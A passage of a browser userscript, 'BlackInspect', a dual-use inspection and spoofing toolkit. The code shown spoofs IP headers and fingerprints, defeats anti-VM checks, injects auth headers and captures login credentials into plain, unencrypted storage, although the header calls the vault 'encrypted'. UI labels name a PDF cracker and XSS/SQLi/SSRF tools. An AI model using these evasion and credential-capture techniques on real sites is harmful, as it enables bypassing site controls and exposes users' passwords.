// ==UserScript==
// @name         BlackInspect v7.1
// @namespace    http://tampermonkey.net/
// @version      7.1.0
// @description  Full inspection & spoofing suite — redesigned UI, encrypted password vault, PDF popup, task manager, security scanner, font picker, and more.
// @author       AradPhpProgrammer
// @match        *://*/*
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        unsafeWindow
// @grant        GM_download
// @grant        GM_notification
// @require      https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js
// ==/UserScript==

(function () {
  "use strict";

  const D = document,
    W = unsafeWindow,
    N = navigator;
  const BS = "bi_v8_panel";
  let html2canvas = W.html2canvas;
  let pdfjsLib = null;
  let pdfCrackStop = false;

  const dk = (base) => `${base}_${location.hostname}`;
  const S = {
    get ip() { return GM_getValue("ip", ""); },
    set ip(v) { GM_setValue("ip", v); },
    get ua() { return GM_getValue("ua", ""); },
    set ua(v) { GM_setValue("ua", v); },
    get platform() { return GM_getValue("platform", ""); },
    set platform(v) { GM_setValue("platform", v); },
    get language() { return GM_getValue("lang", ""); },
    set language(v) { GM_setValue("lang", v); },
    get spoofActive() { return GM_getValue("spoofActive", false); },
    set spoofActive(v) { GM_setValue("spoofActive", v); },
    get canvasSpoof() { return GM_getValue("canvasSpoof", false); },
    set canvasSpoof(v) { GM_setValue("canvasSpoof", v); },
    get breakOnStart() { return GM_getValue(dk("bos"), false); },
    set breakOnStart(v) { GM_setValue(dk("bos"), v); },
    get passwords() { try { return JSON.parse(GM_getValue("passwords", "[]")); } catch(e) { return []; } },
    set passwords(v) { GM_setValue("passwords", JSON.stringify(v)); },
    get todos() { try { return JSON.parse(GM_getValue("todos", "[]")); } catch(e) { return []; } },
    set todos(v) { GM_setValue("todos", JSON.stringify(v)); },
    get panelLeft() { return GM_getValue("panelLeft", 10); },
    set panelLeft(v) { GM_setValue("panelLeft", v); },
    get panelTop() { return GM_getValue("panelTop", 10); },
    set panelTop(v) { GM_setValue("panelTop", v); },
    get panelWidth() { return GM_getValue("panelWidth", Math.min(W.innerWidth - 20, 940)); },
    set panelWidth(v) { GM_setValue("panelWidth", v); },
    get panelHeight() { return GM_getValue("panelHeight", Math.min(W.innerHeight - 20, 580)); },
    set panelHeight(v) { GM_setValue("panelHeight", v); },
    get activeTab() { return GM_getValue("activeTab", "Info"); },
    set activeTab(v) { GM_setValue("activeTab", v); },
    get uiLang() { return GM_getValue("langUI", "en"); },
    set uiLang(v) { GM_setValue("langUI", v); },
    get kernelUrl() { return GM_getValue("kernelUrl", "http://localhost:5000"); },
    set kernelUrl(v) { GM_setValue("kernelUrl", v); },
    get panelOpacity() { return parseFloat(GM_getValue("opacity", "1")); },
    set panelOpacity(v) { GM_setValue("opacity", String(v)); },
    get fontSize() { return parseInt(GM_getValue("fontSize", "13")); },
    set fontSize(v) { GM_setValue("fontSize", String(v)); },
    get fontFamily() { return GM_getValue("fontFamily", "IBM Plex Mono"); },
    set fontFamily(v) { GM_setValue("fontFamily", v); },
    get tabVisSpoof() { return GM_getValue("tabVisSpoof", false); },
    set tabVisSpoof(v) { GM_setValue("tabVisSpoof", v); },
    get antiVM() { return GM_getValue("antiVM", false); },
    set antiVM(v) { GM_setValue("antiVM", v); },
    get hideExt() { return GM_getValue("hideExt", false); },
    set hideExt(v) { GM_setValue("hideExt", v); },
    get spoofBuildID() { return GM_getValue("spoofBuildID", false); },
    set spoofBuildID(v) { GM_setValue("spoofBuildID", v); },
    get authActive() { return GM_getValue("authActive", false); },
    set authActive(v) { GM_setValue("authActive", v); },
    get authHName() { return GM_getValue("authHName", "Authorization"); },
    set authHName(v) { GM_setValue("authHName", v); },
    get authHVal() { return GM_getValue("authHVal", ""); },
    set authHVal(v) { GM_setValue("authHVal", v); },
    get preventPre() { return GM_getValue("preventPre", false); },
    set preventPre(v) { GM_setValue("preventPre", v); },
    get customCtx() { return GM_getValue("customCtx", false); },
    set customCtx(v) { GM_setValue("customCtx", v); },
    get fillProfile() { try { return JSON.parse(GM_getValue("fillProfile", "{}")); } catch(e) { return {}; } },
    set fillProfile(v) { GM_setValue("fillProfile", JSON.stringify(v)); },
    get passFile() { return GM_getValue("passFile", "passwords.json"); },
    set passFile(v) { GM_setValue("passFile", v); },
    get profileFile() { return GM_getValue("profileFile", "bi_profile.json"); },
    set profileFile(v) { GM_setValue("profileFile", v); },
    get breakOptions() { try { return JSON.parse(GM_getValue(dk("brkOpts"), '{"contextmenu":true,"copy":true,"paste":true,"selectstart":true,"dragstart":true,"mousedown":true}')); } catch(e) { return { contextmenu: true, copy: true, paste: true, selectstart: true, dragstart: true, mousedown: true }; } },
    set breakOptions(v) { GM_setValue(dk("brkOpts"), JSON.stringify(v)); },
    get kernelOnline() { return GM_getValue("kernelOnline", false); },
    set kernelOnline(v) { GM_setValue("kernelOnline", v); },
  };

  const TRANS = {
    Info: { en: "Info", fa: "اطلاعات" }, Vars: { en: "Vars", fa: "متغیرها" }, Inject: { en: "Inject", fa: "تزریق" },
    Spoof: { en: "Spoof", fa: "جعل" }, Pass: { en: "Pass", fa: "رمزها" }, Storage: { en: "Storage", fa: "ذخیره‌سازی" },
    Tools: { en: "Tools", fa: "ابزارها" }, DOM: { en: "DOM", fa: "DOM" }, Network: { en: "Network", fa: "شبکه" },
    Security: { en: "Security", fa: "امنیت" }, PDF: { en: "PDF", fa: "PDF" }, Tasks: { en: "Tasks", fa: "وظایف" },
    Settings: { en: "Settings", fa: "تنظیمات" }, "Filter...": { en: "Filter...", fa: "فیلتر..." }, Save: { en: "Save", fa: "ذخیره" },
    Delete: { en: "Delete", fa: "حذف" }, Edit: { en: "Edit", fa: "ویرایش" }, Cancel: { en: "Cancel", fa: "انصراف" },
    Add: { en: "Add", fa: "افزودن" }, Export: { en: "Export", fa: "خروجی" }, Import: { en: "Import", fa: "وارد کردن" },
    Generate: { en: "Generate", fa: "تولید" }, Scan: { en: "Scan", fa: "اسکن" }, Stop: { en: "Stop", fa: "توقف" },
    Start: { en: "Start", fa: "شروع" }, Apply: { en: "Apply", fa: "اعمال" }, Reset: { en: "Reset", fa: "بازنشانی" },
    Copy: { en: "Copy", fa: "کپی" }, Open: { en: "Open", fa: "باز کردن" }, Close: { en: "Close", fa: "بستن" },
    "Loading...": { en: "Loading...", fa: "در حال بارگذاری..." }, Error: { en: "Error", fa: "خطا" }, "No data": { en: "No data", fa: "داده‌ای نیست" },
    "Start Spoofing": { en: "Start Spoofing", fa: "شروع جعل" }, "Stop Spoofing": { en: "Stop Spoofing", fa: "توقف جعل" },
    "Spoofing active": { en: "Spoofing active", fa: "جعل فعال است" }, "Fake IP": { en: "Fake IP (X-Forwarded-For)", fa: "IP جعلی" },
    "User-Agent": { en: "User-Agent", fa: "User-Agent" }, Platform: { en: "Platform", fa: "سیستم‌عامل" }, Language: { en: "Language", fa: "زبان" },
    "Break on load": { en: "Break on load", fa: "شکستن محدودیت‌ها هنگام بارگذاری" }, "Canvas Spoof": { en: "Canvas Fingerprint Spoof", fa: "جعل اثر انگشت Canvas" },
    "Tab Visibility": { en: "Tab Visibility Spoof", fa: "جعل نمایان بودن تب" }, "Anti-VM": { en: "Anti-VM Detection", fa: "جلوگیری از تشخیص VM" },
    "Hide Extensions": { en: "Hide Browser Extensions", fa: "مخفی‌سازی افزونه‌ها" }, "Spoof BuildID": { en: "Spoof Firefox BuildID", fa: "جعل BuildID فایرفاکس" },
    "Password Generator": { en: "Password Generator", fa: "تولید رمز عبور" }, Length: { en: "Length", fa: "طول" },
    Numbers: { en: "Numbers", fa: "اعداد" }, Uppercase: { en: "Uppercase", fa: "حروف بزرگ" }, Lowercase: { en: "Lowercase", fa: "حروف کوچک" },
    Letters: { en: "Letters", fa: "حروف" }, "Special Chars": { en: "Special Chars", fa: "کاراکترهای خاص" }, "Generated password": { en: "Generated password", fa: "رمز تولیدشده" },
    "Use Password": { en: "Use Password", fa: "استفاده از رمز" }, "Saved Passwords": { en: "Saved Passwords", fa: "رمزهای ذخیره‌شده" },
    Username: { en: "Username / Email", fa: "نام کاربری / ایمیل" }, "No passwords saved": { en: "No passwords saved yet.", fa: "هنوز رمزی ذخیره نشده." },
    "Password saved": { en: "Password saved!", fa: "رمز ذخیره شد!" }, "Save password?": { en: "Save password?", fa: "رمز ذخیره شود؟" },
    "Yes, Save": { en: "Yes, Save", fa: "بله، ذخیره کن" }, "Load PDF": { en: "Load PDF File", fa: "بارگذاری فایل PDF" },
    "PDF URL": { en: "PDF URL", fa: "آدرس PDF" }, "PDF Password": { en: "PDF Password (optional)", fa: "رمز PDF (اختیاری)" },
    "Crack Password": { en: "Crack Password", fa: "شکستن رمز PDF" }, "Common Passwords": { en: "Common Passwords", fa: "رمزهای رایج" },
    "Custom Wordlist": { en: "Custom Wordlist", fa: "لیست کلمات دلخواه" }, "Digit Range": { en: "Digit Range", fa: "محدوده عددی" },
    "Found! Password": { en: "Found! Password", fa: "یافت شد! رمز" }, "Not found": { en: "Not found in list.", fa: "در لیست پیدا نشد." },
    Trying: { en: "Trying", fa: "در حال امتحان" }, "Add Task": { en: "Add Task", fa: "وظیفه جدید" }, "Add Note": { en: "Add Note", fa: "یادداشت جدید" },
    "Task desc": { en: "Description...", fa: "توضیحات..." }, "Due date": { en: "Due date", fa: "موعد مقرر" },
    "Notify in mins": { en: "Notify in (minutes)", fa: "اعلان بعد از (دقیقه)" }, Priority: { en: "Priority", fa: "اولویت" },
    Low: { en: "Low", fa: "پایین" }, Medium: { en: "Medium", fa: "متوسط" }, High: { en: "High", fa: "بالا" },
    "No priority": { en: "No priority", fa: "بدون اولویت" }, "No tasks": { en: "No tasks yet — add one above!", fa: "هنوز وظیفه‌ای ثبت نشده!" },
    "No notes": { en: "No notes yet — write one above!", fa: "هنوز یادداشتی نیست!" }, "Show done": { en: "Show completed", fa: "نمایش انجام‌شده‌ها" },
    "Clear done": { en: "Clear completed", fa: "حذف انجام‌شده‌ها" }, "Delete all": { en: "Delete all", fa: "حذف همه" },
    "Search tasks": { en: "Search tasks...", fa: "جستجو در وظایف..." }, "Search notes": { en: "Search notes...", fa: "جستجو در یادداشت‌ها..." },
    "Sort by": { en: "Sort by", fa: "مرتب‌سازی بر اساس" }, Created: { en: "Created", fa: "تاریخ ساخت" }, Due: { en: "Due date", fa: "موعد مقرر" },
    Title: { en: "Title", fa: "عنوان" }, "XSS Scanner": { en: "XSS Scanner", fa: "اسکنر XSS" }, "SQLi Scanner": { en: "SQLi Scanner", fa: "اسکنر SQLi" },
    Clickjacking: { en: "Clickjacking Check", fa: "بررسی Clickjacking" }, "HTML Injection": { en: "HTML Injection", fa: "تزریق HTML" },
    "XXE Payloads": { en: "XXE Payloads", fa: "بارهای XXE" }, "SSRF Payloads": { en: "SSRF Payloads", fa: "بارهای SSRF" },
    "Subdomain Takeover": { en: "Subdomain Takeover", fa: "تصاحب زیردامنه" }, "Directory BF": { en: "Directory BruteForce", fa: "جستجوی مسیر" },
    "XSS Inject": { en: "XSS Inject (Debug)", fa: "تزریق XSS (دیباگ)" }, Vulnerable: { en: "⚠ VULNERABLE", fa: "⚠ آسیب‌پذیر" },
    Protected: { en: "✅ PROTECTED", fa: "✅ محافظت شده" }, "No params": { en: "No URL params found.", fa: "پارامتر URL یافت نشد." },
    "Auth Injection": { en: "Auth Header Injection", fa: "تزریق هدر احراز هویت" }, "Prevent Preflight": { en: "Prevent Preflight", fa: "جلوگیری از Preflight" },
    "SSL Headers": { en: "SSL/TLS Security Headers", fa: "هدرهای امنیتی SSL" }, "Header Name": { en: "Header Name", fa: "نام هدر" },
    "Token Value": { en: "Token / Value", fa: "توکن / مقدار" }, Cookies: { en: "Cookies", fa: "کوکی‌ها" },
    LocalStorage: { en: "LocalStorage", fa: "LocalStorage" }, SessionStorage: { en: "SessionStorage", fa: "SessionStorage" },
    "Set Cookie": { en: "Set Cookie", fa: "تنظیم کوکی" }, "No cookies": { en: "No cookies", fa: "کوکی‌ای وجود ندارد" },
    "Break Restrictions": { en: "Break Restrictions", fa: "شکستن محدودیت‌ها" }, "Restore Restrictions": { en: "Restore Restrictions", fa: "بازگرداندن محدودیت‌ها" },
    "Download Page": { en: "Download Full Page", fa: "دانلود کامل صفحه" }, "Copy Text": { en: "Copy All Text", fa: "کپی همه متن" },
    Screenshot: { en: "Full Page Screenshot", fa: "عکس کامل صفحه" }, "Show Passwords": { en: "Reveal Password Fields", fa: "نمایش فیلدهای رمز" },
    "Split AI": { en: "Split View with AI", fa: "نمای دوگانه با هوش مصنوعی" }, "UI Language": { en: "UI Language", fa: "زبان رابط" },
    "Font Size": { en: "Font Size", fa: "اندازه فونت" }, "Font Family": { en: "Font Family", fa: "فونت" },
    "Panel Opacity": { en: "Panel Opacity", fa: "شفافیت پنل" }, "Kernel URL": { en: "Kernel URL", fa: "آدرس Kernel" },
    "Test Kernel": { en: "Test Kernel", fa: "تست Kernel" }, "Kernel online": { en: "✅ Kernel is online!", fa: "✅ Kernel فعال است!" },
    "Kernel offline": { en: "❌ Kernel offline — passwords stored locally.", fa: "❌ Kernel آفلاین — رمزها به‌صورت محلی ذخیره می‌شوند." },
    "Custom Right-Click": { en: "Custom Right-Click Menu", fa: "منوی کلیک راست سفارشی" }, "Reset Position": { en: "Reset Panel Position (Ctrl+Z)", fa: "بازنشانی موقعیت پنل (Ctrl+Z)" },
    "Form Profile": { en: "Form Auto-Fill Profile", fa: "پروفایل پرکردن فرم" }, "Full Name": { en: "Full Name", fa: "نام کامل" },
    Email: { en: "Email", fa: "ایمیل" }, Phone: { en: "Phone", fa: "تلفن" }, Address: { en: "Address", fa: "آدرس" },
    Birthday: { en: "Birthday", fa: "تاریخ تولد" }, "Save Profile": { en: "Save Profile", fa: "ذخیره پروفایل" },
    "Fill Forms": { en: "Fill Page Forms", fa: "پر کردن فرم‌های صفحه" }, "Profile saved": { en: "Profile saved.", fa: "پروفایل ذخیره شد." },
  };

  const T = (key) => { const e = TRANS[key]; if (!e) return key; return e[S.uiLang] || e["en"] || key; };

  const FONTS = [
    { name: "IBM Plex Mono", url: "https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&display=swap" },
    { name: "Vazirmatn", url: "https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" },
    { name: "Fira Code", url: "https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap" },
    { name: "JetBrains Mono", url: "https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" },
    { name: "Space Mono", url: "https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" },
    { name: "Courier Prime", url: "https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap" },
  ];

  function loadFont(fontName) { const f = FONTS.find(x=>x.name===fontName); if(!f)return; const id="bi-font-"+fontName.replace(/\s/g,"_"); if(!D.getElementById(id)){ const lnk=D.createElement("link"); lnk.id=id; lnk.rel="stylesheet"; lnk.href=f.url; D.head.appendChild(lnk); } }
  function applyFont() { loadFont(S.fontFamily); const st=D.getElementById("bi-font-style"); if(st) st.textContent=`#${BS},#${BS} *{font-family:'${S.fontFamily}',Consolas,monospace!important;font-size:${S.fontSize}px!important;}`; }

  let panel = null;
  let restrictionsBroken = false;
  let dirScanStop = false;
  let saveDirectoryHandle = null;
  let fpsRafId = null, fpsCount = 0, fpsLastTime = performance.now(), currentFps = 0;

  (function earlyApply() {
    if(S.spoofActive) applySpoofing(S.ip, S.ua, S.platform, S.language);
    if(S.canvasSpoof) applyCanvasSpoof();
    if(S.tabVisSpoof) applyTabVisSpoof();
    if(S.hideExt) applyHideExt();
    if(S.spoofBuildID) applyBuildIDSpoof();
    if(S.antiVM) applyAntiVM();
    if(S.authActive) applyAuthInjection();
    if(S.preventPre) applyPreflightPrevention();
    if(S.breakOnStart) { breakRestrictions(S.breakOptions); restrictionsBroken = true; }
    FONTS.forEach(f=>loadFont(f.name));
    startFPS();
    checkKernelSilent();
  })();

  function applySpoofing(ip,ua,plat,lang) {
    const origFetch=W.fetch, origXHR=W.XMLHttpRequest;
    W.fetch = function(...args) { let [resource, options={}] = args; const headers=new Headers(options.headers||(resource instanceof Request?resource.headers:{})); if(ip) headers.set("X-Forwarded-For",ip); if(ua) headers.set("User-Agent",ua); if(resource instanceof Request) resource=new Request(resource,{...options,headers}); else options={...options,headers}; return origFetch.call(this,resource,options); };
    W.XMLHttpRequest = class extends origXHR { open(...a){ this._bi_open=true; return super.open(...a); } send(...a){ if(this._bi_open){ if(ip) this.setRequestHeader("X-Forwarded-For",ip); if(ua) this.setRequestHeader("User-Agent",ua); } return super.send(...a); } };
    if(ua) try{ Object.defineProperty(N,"userAgent",{get:()=>ua,configurable:true}); }catch(e){}
    if(plat) try{ Object.defineProperty(N,"platform",{get:()=>plat,configurable:true}); }catch(e){}
    if(lang) try{ Object.defineProperty(N,"language",{get:()=>lang,configurable:true}); }catch(e){}
  }
  function applyCanvasSpoof() { try{ const orig=HTMLCanvasElement.prototype.getContext; HTMLCanvasElement.prototype.getContext=function(){ const ctx=orig.apply(this,arguments); if(ctx && arguments[0]==="2d"){ const origGID=ctx.getImageData.bind(ctx); ctx.getImageData=function(x,y,w,h){ const d=origGID(x,y,w,h); const n=new Uint8Array(d.data.length); crypto.getRandomValues(n); for(let i=0;i<d.data.length;i+=4){ d.data[i]=Math.max(0,Math.min(255,d.data[i]+((n[i]%3)-1))); d.data[i+1]=Math.max(0,Math.min(255,d.data[i+1]+((n[i+1]%3)-1))); d.data[i+2]=Math.max(0,Math.min(255,d.data[i+2]+((n[i+2]%3)-1))); } return d; }; } return ctx; }; }catch(e){} }
  function applyTabVisSpoof() { try{ Object.defineProperty(D,"hidden",{get:()=>false,configurable:true}); Object.defineProperty(D,"visibilityState",{get:()=>"visible",configurable:true}); D.addEventListener("visibilitychange",(e)=>e.stopImmediatePropagation(),true); W.addEventListener("blur",(e)=>e.stopImmediatePropagation(),true); }catch(e){} }
  function applyHideExt() { try{ const fp=[]; Object.defineProperty(fp,"item",{value:()=>null}); Object.defineProperty(fp,"namedItem",{value:()=>null}); Object.defineProperty(fp,"refresh",{value:()=>{}}); Object.defineProperty(N,"plugins",{get:()=>fp,configurable:true}); Object.defineProperty(N,"mimeTypes",{get:()=>[],configurable:true}); }catch(e){} }
  function applyBuildIDSpoof() { try{ if("buildID" in N) Object.defineProperty(N,"buildID",{get:()=>"20181001000000",configurable:true}); }catch(e){} }
  function applyAntiVM() { try{ Object.defineProperty(N,"hardwareConcurrency",{get:()=>8,configurable:true}); Object.defineProperty(N,"deviceMemory",{get:()=>8,configurable:true}); Object.defineProperty(screen,"width",{get:()=>1920,configurable:true}); Object.defineProperty(screen,"height",{get:()=>1080,configurable:true}); Object.defineProperty(screen,"availWidth",{get:()=>1920,configurable:true}); Object.defineProperty(screen,"availHeight",{get:()=>1040,configurable:true}); Object.defineProperty(screen,"colorDepth",{get:()=>24,configurable:true}); const origGP=WebGLRenderingContext.prototype.getParameter; WebGLRenderingContext.prototype.getParameter=function(p){ if(p===37445) return "Intel Inc."; if(p===37446) return "Intel Iris OpenGL Engine"; return origGP.call(this,p); }; }catch(e){} }
  function applyAuthInjection() { if(!S.authActive||!S.authHVal) return; const hn=S.authHName||"Authorization", hv=S.authHVal; const oF=W.fetch; W.fetch=function(...args){ let [r,o={}]=args; const h=new Headers(o.headers||(r instanceof Request?r.headers:{})); h.set(hn,hv); if(r instanceof Request) r=new Request(r,{...o,headers:h}); else o={...o,headers:h}; return oF.call(this,r,o); }; const OX=W.XMLHttpRequest; W.XMLHttpRequest=class extends OX{ open(...a){ this._bio=true; return super.open(...a); } send(...a){ if(this._bio) this.setRequestHeader(hn,hv); return super.send(...a); } }; }
  function applyPreflightPrevention() { if(!S.preventPre) return; const oF=W.fetch; W.fetch=function(r,o={}){ const h=new Headers(o.headers||{}); const ct=h.get("content-type")||""; if(!["application/x-www-form-urlencoded","multipart/form-data","text/plain"].some(t=>ct.startsWith(t))) h.set("content-type","text/plain"); for(const k of [...h.keys()]) if(!["accept","accept-language","content-language","content-type"].includes(k.toLowerCase())) h.delete(k); return oF.call(this,r,{...o,headers:h}); }; }
  function breakRestrictions(opts) { const o=opts||S.breakOptions; if(o.contextmenu){ D.oncontextmenu=null; if(D.body) D.body.oncontextmenu=null; W.oncontextmenu=null; } if(o.selectstart||o.copy){ const s=D.createElement("style"); s.id="bi-break-style"; if(o.selectstart) s.textContent+="*,*::before,*::after{user-select:auto!important;-webkit-user-select:auto!important;pointer-events:auto!important}"; if(!D.getElementById("bi-break-style")) D.head && D.head.appendChild(s); D.querySelectorAll('[style*="pointer-events:none"]').forEach(el=>el.style.pointerEvents="auto"); } ["copy","cut","paste","selectstart","contextmenu","dragstart","mousedown"].forEach(ev=>{ if(o[ev]){ D.addEventListener(ev,(e)=>{ e.stopImmediatePropagation(); e.stopPropagation(); Object.defineProperty(e,"preventDefault",{value:()=>{}}); },true); W.addEventListener(ev,(e)=>{ e.stopImmediatePropagation(); e.stopPropagation(); Object.defineProperty(e,"preventDefault",{value:()=>{}}); },true); } }); if(o.copy){ D.addEventListener("copy",(e)=>{ e.stopImmediatePropagation(); const sel=getSelection().toString(); if(sel && e.clipboardData){ e.clipboardData.setData("text/plain",sel); e.preventDefault(); } },true); } D.querySelectorAll("[oncopy],[oncut],[onpaste],[oncontextmenu],[onselectstart]").forEach(el=>{ el.oncopy=el.oncut=el.onpaste=el.oncontextmenu=el.onselectstart=null; }); }
  function startFPS() { fpsCount=0; fpsLastTime=performance.now(); function frame(){ fpsCount++; const now=performance.now(); if(now-fpsLastTime>=1000){ currentFps=fpsCount; fpsCount=0; fpsLastTime=now; const hud=D.getElementById("bi-fps-hud"); if(hud) hud.textContent=currentFps+" fps"; } fpsRafId=requestAnimationFrame(frame); } if(fpsRafId) cancelAnimationFrame(fpsRafId); fpsRafId=requestAnimationFrame(frame); }
  async function kernelFetch(path,opts={}){ const url=S.kernelUrl+path; return fetch(url,{headers:{"Content-Type":"application/json",...(opts.headers||{})},...opts}); }
  async function checkKernelSilent(){ try{ const r=await kernelFetch("/health"); S.kernelOnline=r.ok; }catch(e){ S.kernelOnline=false; } }
  async function savePasswordKernel(entry){ if(S.kernelOnline){ try{ await kernelFetch("/passwords/save",{method:"POST",body:JSON.stringify(entry)}); return true; }catch(e){} } const arr=S.passwords; arr.push({...entry,saved_at:new Date().toISOString()}); S.passwords=arr; return false; }
  async function loadPasswordsKernel(){ if(S.kernelOnline){ try{ const r=await kernelFetch("/passwords/list"); if(r.ok){ const d=await r.json(); return d.passwords||[]; } }catch(e){} } return S.passwords; }

  (function detectLogin() {
    D.addEventListener("submit", async (e) => {
      const form = e.target;
      if (!form) return;
      const passField = form.querySelector("input[type=password]");
      if (!passField) return;
      const userField = form.querySelector("input[type=email],input[type=text],[name*=user],[name*=email],[id*=user],[id*=email]");
      const pass = passField.value;
      const user = userField ? userField.value : "";
      if (!pass) return;
      const notify = D.createElement("div");
      notify.id = "bi-save-prompt";
      notify.style.cssText = `position:fixed;bottom:80px;right:20px;z-index:2147483647;background:#161b22;border:1px solid #3fb950;border-radius:12px;padding:16px 20px;color:#c9d1d9;font-family:'IBM Plex Mono',monospace;font-size:13px;box-shadow:0 8px 32px rgba(0,0,0,0.7);display:flex;flex-direction:column;gap:10px;min-width:280px;animation:bi-slideup 0.3s ease;`;
      const style = D.createElement("style");
      style.textContent = `@keyframes bi-slideup{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}`;
      D.head.appendChild(style);
      notify.innerHTML = `<div style="display:flex;align-items:center;gap:8px;"><span style="font-size:20px;">🔐</span><span style="color:#3fb950;font-weight:600;">${T("save password?")}</span></div><div style="color:#8b949e;font-size:12px;">${location.hostname} · ${user || "unknown user"}</div><div style="display:flex;gap:8px;"><button id="bi-savepw-yes" style="flex:1;background:#3fb950;color:#0d1117;border:none;border-radius:6px;padding:7px 14px;cursor:pointer;font-family:inherit;font-size:12px;font-weight:600;">${T("Yes, Save")}</button><button id="bi-savepw-no"  style="flex:1;background:#21262d;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:7px 14px;cursor:pointer;font-family:inherit;font-size:12px;">No</button></div>`;
      D.body.appendChild(notify);
      D.getElementById("bi-savepw-yes").onclick = async () => { await savePasswordKernel({ domain: location.hostname, username: user, password: pass, url: location.href }); notify.remove(); };
      D.getElementById("bi-savepw-no").onclick = () => notify.remove();
      setTimeout(()=>{ if(D.getElementById("bi-save-prompt")) notify.remove(); },12000);
    }, true);
  })();

  setInterval(()=>{ const todos=S.todos; let changed=false; todos.forEach((t,i)=>{ if(t.time && !t.notified && Date.now()>=t.time){ if("Notification" in W && Notification.permission==="granted") new Notification("⚙ BlackInspect",{body:t.text}); todos[i].notified=true; changed=true; } }); if(changed) S.todos=todos; },15000);

  D.addEventListener("contextmenu",(e)=>{ if(!S.customCtx) return; if(e.target.closest("#"+BS)||e.target.closest("#bi-ctxmenu")) return; e.preventDefault(); showCtxMenu(e.clientX,e.clientY,e.target); },true);
  function showCtxMenu(x,y,target){ D.getElementById("bi-ctxmenu")?.remove(); const menu=D.createElement("div"); menu.id="bi-ctxmenu"; menu.style.cssText=`position:fixed;top:${Math.min(y,W.innerHeight-280)}px;left:${Math.min(x,W.innerWidth-200)}px;background:#161b22;border:1px solid #30363d;border-radius:10px;z-index:2147483647;min-width:190px;box-shadow:0 8px 32px rgba(0,0,0,0.8);font-family:'IBM Plex Mono',Consolas,monospace;font-size:12px;color:#c9d1d9;padding:4px 0;direction:ltr;`; const items=[{i:"📋",t:"Copy",a:()=>D.execCommand("copy")},{i:"✂️",t:"Cut",a:()=>D.execCommand("cut")},{i:"📌",t:"Paste",a:()=>D.execCommand("paste")},null,{i:"🔍",t:"Inspect Element",a:()=>console.log("[BlackInspect]",target)},{i:"📝",t:"Copy outerHTML",a:()=>N.clipboard?.writeText(target.outerHTML)},{i:"🔗",t:"Copy link URL",a:()=>{ const a=target.closest("a"); if(a) N.clipboard?.writeText(a.href); }},{i:"🖼",t:"Copy image src",a:()=>{ const img=target.tagName==="IMG"?target:target.querySelector("img"); if(img) N.clipboard?.writeText(img.src); }},{i:"🔎",t:"View page source",a:()=>window.open("view-source:"+location.href)},null,{i:"⚙",t:"Open BlackInspect",a:()=>{ if(panel) panel.style.display="flex"; else createPanel(); }},{i:"🔓",t:"Break Restrictions",a:()=>{ breakRestrictions(); restrictionsBroken=true; }},{i:"📸",t:"Quick Screenshot",a:()=>takeScreenshot()}]; items.forEach(item=>{ if(!item){ const s=D.createElement("div"); s.style.cssText="border-top:1px solid #21262d;margin:3px 0;"; menu.appendChild(s); return; } const el=D.createElement("div"); el.style.cssText="padding:7px 14px;cursor:pointer;display:flex;align-items:center;gap:8px;border-radius:0;transition:background .1s;"; el.innerHTML=`<span>${item.i}</span><span>${item.t}</span>`; el.onmouseenter=()=>(el.style.background="#21262d"); el.onmouseleave=()=>(el.style.background="transparent"); el.onclick=()=>{ item.a(); menu.remove(); }; menu.appendChild(el); }); D.body.appendChild(menu); setTimeout(()=>{ D.addEventListener("click",()=>menu.remove(),{once:true}); D.addEventListener("keydown",(e)=>{ if(e.key==="Escape") menu.remove(); },{once:true}); },0); }
  function loadPdfjs(){ return new Promise((res,rej)=>{ if(pdfjsLib) return res(pdfjsLib); const s=D.createElement("script"); s.src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"; s.onload=()=>{ pdfjsLib=W.pdfjsLib; pdfjsLib.GlobalWorkerOptions.workerSrc="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js"; res(pdfjsLib); }; s.onerror=rej; D.head.appendChild(s); }); }
  async function takeScreenshot(){ if(!html2canvas){ alert("html2canvas not loaded"); return; } const canvas=await html2canvas(D.body,{ scrollY:-W.scrollY, useCORS:true, scale:1, width:D.documentElement.scrollWidth, height:D.documentElement.scrollHeight, windowWidth:D.documentElement.scrollWidth, windowHeight:D.documentElement.scrollHeight, x:0, y:0, ignoreElements:(el)=>el.id===BS||el.id==="bi-launcher" }); canvas.toBlob((blob)=>{ const a=D.createElement("a"); a.href=URL.createObjectURL(blob); a.download="screenshot_"+D.title.replace(/[^a-z0-9]/gi,"_")+".png"; a.click(); URL.revokeObjectURL(a.href); },"image/png"); }
  function dlBlob(blob,filename){ const a=D.createElement("a"); a.href=URL.createObjectURL(blob); a.download=filename; a.click(); URL.revokeObjectURL(a.href); }
  function resetPanelPos(){ const w=W.innerWidth, h=W.innerHeight; const pw=Math.min(w-20,940), ph=Math.min(h-20,580); S.panelLeft=10; S.panelTop=10; S.panelWidth=pw; S.panelHeight=ph; if(panel){ panel.style.left="10px"; panel.style.top="10px"; panel.style.width=pw+"px"; panel.style.height=ph+"px"; } }
  D.addEventListener("keydown",(e)=>{ if(e.ctrlKey && e.key==="z" && panel && panel.style.display!=="none"){ e.preventDefault(); e.stopPropagation(); resetPanelPos(); } },true);

  function createPanel() {
    if(panel){ panel.style.display="flex"; return; }
    const isRTL=S.uiLang==="fa";
    const pw=S.panelWidth, ph=S.panelHeight; const pl=S.panelLeft, pt=S.panelTop;
    panel=D.createElement("div");
    panel.id=BS;
    panel.dir=isRTL?"rtl":"ltr";
    panel.style.cssText=`position:fixed;top:${pt}px;left:${pl}px;width:${pw}px;height:${ph}px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:12px;box-shadow:0 16px 64px rgba(0,0,0,0.85);z-index:2147483646;overflow:hidden;display:flex;flex-direction:column;resize:both;min-width:360px;min-height:340px;max-width:calc(100vw - 10px);max-height:calc(100vh - 10px);opacity:${S.panelOpacity};`;
    // add CSS custom properties for theme support
    const themeStyle = D.createElement("style");
